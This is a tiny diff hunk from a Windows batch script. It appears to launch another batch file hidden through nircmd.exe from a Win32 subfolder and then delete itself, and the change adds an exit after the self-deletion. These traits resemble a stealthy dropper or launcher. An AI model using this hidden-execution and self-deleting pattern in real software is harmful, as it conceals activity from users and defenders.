@@ -83,5 +83,5 @@ set "boot=%random%%random%"
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%boot%.bat"
 
 endlocal
-DEL /s /f /q /a "%~f0"
+DEL /s /f /q /a "%~f0" && exit
 
